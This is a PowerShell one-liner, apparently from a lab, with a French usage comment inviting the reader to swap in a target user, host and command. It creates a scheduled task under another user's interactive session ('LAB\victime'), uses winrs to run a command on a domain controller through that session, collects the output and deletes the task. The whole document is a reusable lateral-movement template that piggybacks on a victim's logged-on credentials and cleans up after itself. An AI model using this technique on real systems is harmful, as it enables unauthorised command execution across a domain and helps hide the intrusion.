# Usage : remplace TARGET_USER, TARGET_HOST et COMMAND selon le besoin
$tu="LAB\victime"; $cmd="winrs -r:dc01.lab.local hostname > C:\Lab\result.txt 2>&1"; Unregister-ScheduledTask -TaskName "SchtaskAs" -Confirm:$false -ErrorAction SilentlyContinue; $a=New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $cmd" -WorkingDirectory "C:\Lab"; $p=New-ScheduledTaskPrincipal -UserId $tu -LogonType Interactive -RunLevel Limited; Register-ScheduledTask -TaskName "SchtaskAs" -Action $a -Principal $p -Force | Out-Null; Start-ScheduledTask -TaskName "SchtaskAs"; Start-Sleep -Seconds 8; Get-Content C:\Lab\result.txt -ErrorAction SilentlyContinue; Unregister-ScheduledTask -TaskName "SchtaskAs" -Confirm:$false